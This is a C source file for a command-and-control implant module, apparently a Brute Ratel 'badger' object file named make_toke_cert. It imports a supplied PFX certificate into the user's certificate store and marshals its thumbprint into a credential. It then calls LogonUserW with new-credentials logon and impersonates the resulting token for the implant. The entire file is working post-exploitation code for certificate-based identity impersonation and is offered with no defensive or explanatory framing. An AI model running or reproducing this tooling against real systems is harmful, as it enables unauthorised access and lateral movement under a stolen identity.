#include <windows.h>
#include <stdio.h>
#include <lmaccess.h>
#include <wincred.h>
#include "../badger_exports.h"

DECLSPEC_IMPORT WINIMPM HCERTSTORE WINAPI Crypt32$CertOpenStore(LPCSTR lpszStoreProvider, DWORD dwEncodingType, HCRYPTPROV_LEGACY hCryptProv, DWORD dwFlags, const void *pvPara);
DECLSPEC_IMPORT WINIMPM HCERTSTORE WINAPI Crypt32$PFXImportCertStore(CRYPT_DATA_BLOB *pPFX, LPCWSTR szPassword, DWORD dwFlags);
DECLSPEC_IMPORT WINIMPM PCCERT_CONTEXT WINAPI Crypt32$CertEnumCertificatesInStore(HCERTSTORE hCertStore, PCCERT_CONTEXT pPrevCertContext);
DECLSPEC_IMPORT WINIMPM WINBOOL WINAPI Crypt32$CertAddCertificateContextToStore(HCERTSTORE hCertStore, PCCERT_CONTEXT pCertContext, DWORD dwAddDisposition, PCCERT_CONTEXT *ppStoreContext);
DECLSPEC_IMPORT WINIMPM WINBOOL WINAPI Crypt32$CertDeleteCertificateFromStore(PCCERT_CONTEXT pCertContext);
DECLSPEC_IMPORT WINIMPM WINBOOL WINAPI Crypt32$CertCloseStore(HCERTSTORE hCertStore, DWORD dwFlags);
DECLSPEC_IMPORT WINIMPM WINBOOL WINAPI Crypt32$CertGetCertificateContextProperty(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void *pvData, DWORD *pcbData);

DECLSPEC_IMPORT DWORD WINAPI Kernel32$GetLastError(VOID);
DECLSPEC_IMPORT WINBASEAPI int WINAPI Kernel32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);

DECLSPEC_IMPORT WINADVAPI WINBOOL WINAPI Advapi32$CredMarshalCredentialW(CRED_MARSHAL_TYPE CredType,PVOID Credential,LPWSTR *MarshaledCredential);
DECLSPEC_IMPORT WINADVAPI WINBOOL WINAPI Advapi32$LogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
DECLSPEC_IMPORT WINADVAPI WINBOOL WINAPI Advapi32$ImpersonateLoggedOnUser(HANDLE hToken);

HCERTSTORE LoadCert(unsigned char * cert, const wchar_t * password, DWORD certlen, PCCERT_CONTEXT * pcert) {
    CRYPT_DATA_BLOB pfxData;
    pfxData.cbData = certlen;
    pfxData.pbData = cert;
    *pcert = NULL;
    PCCERT_CONTEXT pnewcert;
    HCERTSTORE hCertStore = Crypt32$CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_CURRENT_USER, L"MY");
    if (! hCertStore) {
        BadgerDispatch(g_dispatch, "[-] Error CertOpenStore: %lu\n", Kernel32$GetLastError());
        return NULL;
    }
    HCERTSTORE store = Crypt32$PFXImportCertStore(&pfxData, password, CRYPT_USER_KEYSET);
    if (! store) {
        BadgerDispatch(g_dispatch, "[-] Error PFXImportCertStore. Failed to import cert, make sure its in the right format: %lu\n", Kernel32$GetLastError());
        return NULL;
    }
    *pcert = Crypt32$CertEnumCertificatesInStore(store, NULL);
    Crypt32$CertAddCertificateContextToStore(hCertStore, *pcert, CERT_STORE_ADD_ALWAYS, &pnewcert);
    Crypt32$CertDeleteCertificateFromStore(*pcert);
    Crypt32$CertCloseStore(store, 0);
    *pcert = pnewcert;
    return hCertStore;
}

VOID ImpersonateUser(PCCERT_CONTEXT pCertContext) {
    DWORD hashSize = 20;
    CERT_CREDENTIAL_INFO ci;
    ci.cbSize = sizeof(CERT_CREDENTIAL_INFO);
    LPWSTR creds;
    if(! Crypt32$CertGetCertificateContextProperty(pCertContext, CERT_HASH_PROP_ID, ci.rgbHashOfCert, &hashSize)) {
        BadgerDispatch(g_dispatch, "[-] Error CertGetCertificateContextProperty: %lu\n", Kernel32$GetLastError());
        return;
    }
    BadgerDispatch(g_dispatch, "[+] Cert thumbprint: ");
    for (DWORD i = 0; i < hashSize; i++) {
        BadgerDispatch(g_dispatch, "%02X", ci.rgbHashOfCert[i]);
    }
    BadgerDispatch(g_dispatch, "\n");
    if(! Advapi32$CredMarshalCredentialW(1, &ci, &creds)) {
        BadgerDispatch(g_dispatch, "[-] Error CredMarshalCredential: %lu\n", Kernel32$GetLastError());
        return;
    }
    HANDLE hToken = NULL;
    if(!Advapi32$LogonUserW(creds, NULL, NULL, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        BadgerDispatch(g_dispatch, "[-] Error LogonUser: %lu\n", Kernel32$GetLastError());
        return;
    }
    if (Advapi32$ImpersonateLoggedOnUser(hToken)) {
        BadgerDispatch(g_dispatch, "[+] Token impersonated\n");
        BadgerSetToken(hToken);
    } else {
        BadgerDispatch(g_dispatch, "[-] Error ImpersonateLoggedOnUser: %lu\n", Kernel32$GetLastError());
        return;
    }
}

VOID ConvertCharToWChar(char* charString, wchar_t** wcharString) {
    int size_needed = Kernel32$MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);
    *wcharString = (wchar_t*) BadgerAlloc(size_needed * sizeof(wchar_t));
    if (*wcharString) {
        Kernel32$MultiByteToWideChar(CP_ACP, 0, charString, -1, *wcharString, size_needed);
    }
}

void coffee(char **argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;
    if (argc < 1) {
        BadgerDispatch(g_dispatch, "[!] Usage: make_toke_cert.o <cert password>\n[!] NOTE: configure certificate file using 'set_coffargs'\n");
        return;
    }
    unsigned char* cert = argv[0];
    DWORD certlen = BadgerGetBufferSize(argv[0]);
    DWORD dwErrorCode = ERROR_SUCCESS;
    WCHAR* wpassword = NULL;
    if (argc == 2) {
        ConvertCharToWChar(argv[1], &wpassword);
    }
    BadgerDispatch(g_dispatch, "[+] Loading certificate into temp store\n");
    PCCERT_CONTEXT pcert = NULL;
    HCERTSTORE store = LoadCert(cert, wpassword, certlen, &pcert);
    if (pcert) {
        ImpersonateUser(pcert);
        Crypt32$CertDeleteCertificateFromStore(pcert);
        Crypt32$CertCloseStore(store, 0);
    } else {
        BadgerDispatch(g_dispatch, "[-] Failed\n");
    }
    BadgerFree((PVOID*)&wpassword);
};
